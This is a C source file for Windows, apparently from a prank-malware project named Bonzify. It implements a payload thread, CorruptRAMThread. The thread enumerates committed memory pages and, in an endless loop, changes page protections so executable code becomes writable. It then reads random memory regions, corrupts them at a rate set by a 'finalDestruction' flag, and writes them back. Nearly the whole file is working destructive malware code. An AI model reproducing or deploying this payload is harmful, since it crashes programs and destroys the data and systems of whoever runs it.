#include <Windows.h>

#include "../Bonzify/Utils.h"
#include "Payloads.h"

#define BUFFER_SIZE 65536
#define CODE_CHANCE_MULTIPLIER 10

#define CanExecute(page) page->Protect == PAGE_EXECUTE || page->Protect == PAGE_EXECUTE_READ || page->Protect == PAGE_EXECUTE_READWRITE || page->Protect == PAGE_EXECUTE_WRITECOPY

typedef struct {
	int count;
	size_t totalSize;
	MEMORY_BASIC_INFORMATION *data;
} MemoryPages;

typedef struct {
	PVOID address;
	PMEMORY_BASIC_INFORMATION page;
} RandomAddressResult;

static MemoryPages ListMemoryPages(HANDLE process);
static RandomAddressResult RandomAddress(MemoryPages *pages);

DWORD WINAPI CorruptRAMThread(LPVOID parameter) {
	HANDLE process = GetCurrentProcess();

	BYTE* buf = (BYTE*)MemeAlloc(BUFFER_SIZE);

	MemoryPages pages = ListMemoryPages(process);
	for (;;) {
		int baseChance = finalDestruction ? 50000 : 2500000;

		RandomAddressResult addr = RandomAddress(&pages);

		DWORD oldProtect; BOOL res;
		// TODO: Fix the crash caused by that
		if (CanExecute(addr.page)) {
			res = VirtualProtectEx(process, addr.page->BaseAddress, addr.page->RegionSize, PAGE_EXECUTE_READWRITE, &oldProtect);
		} else {
			res = VirtualProtectEx(process, addr.page->BaseAddress, addr.page->RegionSize, PAGE_READWRITE, &oldProtect);
		}

		if (!res) {
			continue;
		}

		SIZE_T read = 0;

		// In theory ReadProcessMemory and WriteProcessMemory for the current process are not required,
		// but it's safer and the code was taken from another project anyway.
		if (ReadProcessMemory(process, addr.address, buf, BUFFER_SIZE, &read) || GetLastError() == ERROR_PARTIAL_COPY) {
			int chance = CanExecute(addr.page) ? baseChance * CODE_CHANCE_MULTIPLIER : baseChance;

			SIZE_T corrupted = CorruptMemory(buf, read, chance);
			SIZE_T written;

			if (WriteProcessMemory(process, addr.address, buf, read, &written)) {
				Sleep(10);
			} else {

			}
		} else {

		}

		DWORD olderProtect;
		VirtualProtectEx(process, addr.page->BaseAddress, addr.page->RegionSize, oldProtect, &olderProtect);
	}
}

static MemoryPages ListMemoryPages(HANDLE process) {
	MEMORY_BASIC_INFORMATION mbi;
	mbi.BaseAddress = 0;
	mbi.RegionSize = 0;

	// Count Pages
	int count = 0;

	PVOID addr = 0;
	while (VirtualQueryEx(process, addr, &mbi, sizeof(mbi)) != 0) {
		if (mbi.State == MEM_COMMIT) {
			count++;
		}

		addr = (byte*)mbi.BaseAddress + mbi.RegionSize;
	}

	MemoryPages out;
	out.count = count;

	out.data = (PMEMORY_BASIC_INFORMATION)MemeAlloc(sizeof(MEMORY_BASIC_INFORMATION)*count);
	out.totalSize = 0;

	addr = 0;
	for (int i = 0; i < count;) {
		if (VirtualQueryEx(process, addr, &out.data[i], sizeof(mbi))) {
			addr = ((byte*)out.data[i].BaseAddress) + out.data[i].RegionSize;

			if (out.data[i].State == MEM_COMMIT) {
				out.totalSize += out.data[i].RegionSize;
				i++;
			}
		}
	}

	return out;
}

static RandomAddressResult RandomAddress(MemoryPages *pages) {
	// Weighted Random
	size_t randomSize = randomSizeT() % pages->totalSize;

	size_t currentSize = 0;
	// Find out which page corresponds to this
	for (int i = 0; i < pages->count; i++) {
		size_t nextSize = currentSize + pages->data[i].RegionSize;

		if (randomSize >= currentSize && randomSize <= nextSize) {
			// We found the matching page!

			size_t addrIndex = randomSizeT() % (pages->data[i].RegionSize - BUFFER_SIZE + 1);
			return {
				(PVOID)(((size_t)pages->data[i].BaseAddress) + addrIndex),
				&pages->data[i]
			};
		}

		currentSize = nextSize;
	}

	return{ 0, 0 };
}
